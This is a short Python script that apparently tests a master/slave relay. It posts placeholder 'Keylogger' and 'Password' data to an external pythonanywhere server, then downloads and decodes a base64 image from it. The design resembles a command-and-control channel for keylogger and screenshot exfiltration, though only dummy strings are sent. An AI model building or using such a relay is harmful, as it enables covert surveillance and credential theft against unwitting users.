import requests
from PIL import Image
import io
import base64

# Fetch data from server
url = "https://swadheenmishra123.pythonanywhere.com/"
payload = {"Type": "slave", "data": ["Keylogger", "How are you?", "Password"]}
requests.post(url + "receive_data", json=payload)

# Get response from server
response = requests.get(url + "send_data?Type=master").json()['data'].split(', ')

# Extract the image (assuming it's Base64 encoded)
img_base64 = response[2]

# If the string has a prefix like "data:image/png;base64,", strip it
if img_base64.startswith("data:image"):
    img_base64 = img_base64.split(",")[1]

# Decode Base64 to raw bytes
img_bytes = base64.b64decode(img_base64)

# Open the image from bytes
image = Image.open(io.BytesIO(img_bytes))

# Show or save the image
image.show()
image.save("reconstructed_image.png")
